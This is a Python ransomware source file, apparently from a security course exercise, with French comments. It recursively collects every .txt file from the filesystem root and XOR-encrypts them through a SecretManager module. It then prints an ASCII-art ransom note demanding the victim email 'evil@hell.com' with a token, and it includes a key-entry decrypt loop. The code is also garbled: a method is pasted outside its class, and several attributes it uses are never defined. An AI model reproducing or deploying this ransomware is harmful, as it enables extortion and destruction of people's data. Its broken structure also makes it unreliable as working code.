import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        raise NotImplemented()

    def encrypt(self):
        # 1. Lister les fichiers txt
        txt_files = self.get_files("*.txt")
        self._log.debug(f"Found {len(txt_files)} txt files to encrypt.")

        # 2. Créer le SecretManager
        secret_manager = SecretManager()

        # 3. Appeler setup()
        secret_manager.setup()

        # 4. Chiffrer les fichiers
        secret_manager.xorfiles(txt_files)

        # 5. Afficher un message permettant à la victime de contacter l'attaquant avec le token au format hex
        hex_token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=hex_token))

        

    def decrypt(self):
        # Charger les éléments cryptographiques locaux
        self.secret_manager.load()

        # Charger la liste des fichiers chiffrés
        encrypted_files = self.list_encrypted_files()

        while True:
            try:
                # Demander la clef
                b64_key = input("Veuillez entrer la clef de déchiffrement (en base64) : ")

                # Définir la clef
                self.secret_manager.set_key(b64_key)

                # Déchiffrer les fichiers
                self.secret_manager.xorfiles(encrypted_files)

                # Supprimer les éléments cryptographiques locaux
                self.secret_manager.clean()

                # Afficher un message pour informer que tout s'est bien passé
                print("Félicitations ! Vos fichiers ont été déchiffrés avec succès.")

                # Sortir du ransomware
                break
            except Exception as e:
                # Afficher un message indiquant que la clef est mauvaise
                print("La clef de déchiffrement est incorrecte. Veuillez réessayer.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()


def get_files(self, filter: str) -> list:
        # Initialize an empty list to store the matching files
        matching_files = []

        # Use the rglob function to find all files matching the filter
        for file in Path("/").rglob(filter):
            # Add the absolute path of the file to the list
            matching_files.append(str(file.resolve()))

        # Return the list of matching files
        return matching_files        